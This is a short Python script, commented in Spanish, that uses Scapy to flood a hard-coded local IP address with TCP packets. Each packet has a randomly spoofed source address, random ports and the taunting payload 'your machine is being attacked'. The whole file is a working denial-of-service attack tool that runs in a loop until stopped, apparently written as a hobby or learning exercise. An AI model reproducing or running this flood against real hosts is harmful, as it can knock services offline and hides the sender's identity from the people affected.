#! /usr/bin/env python3
#_*_ coding: utf8_*_

from scapy.all import *
import sys

#target = '192.168.100.37'
target = '192.168.0.224'
message = "TU MAQUINA ESTA SIENDO ATACADA XDXD"

def main():
    try:
        cont = 0
        while True:
            src_ip = RandIP() # NOTE: Origen del paquete
            sport = RandShort() #Devuelve un valor entre 1 a 65,535
            # NOTE: sport = puerto origen
            dport = RandShort()# NOTE: El puerto destino de la maquina a atacar

            IP_layer = IP(src=src_ip, dst=target) # NOTE: dst = objetivo
            TCP_layer = TCP(sport=sport, dport=dport)
            Raw_layer = Raw(load=message) # NOTE: Raw contendra un mensaje que enviaremos, usando la clase Raw
            final_packet = IP_layer/TCP_layer/Raw_layer
            send(final_packet, verbose=False)
            #Verbose es la cantidad de contenido que se muestar en pantalla

            cont += 1
            sys.stdout.write('\r N.P --> '+str(cont) + " IP SRC -->  "+str(src_ip) + " SRC PORT --> "+str(sport)),
            sys.stdout.flush()
    except KeyboardInterrupt:
        print()
        exit(0)


if __name__ == '__main__':
    main()
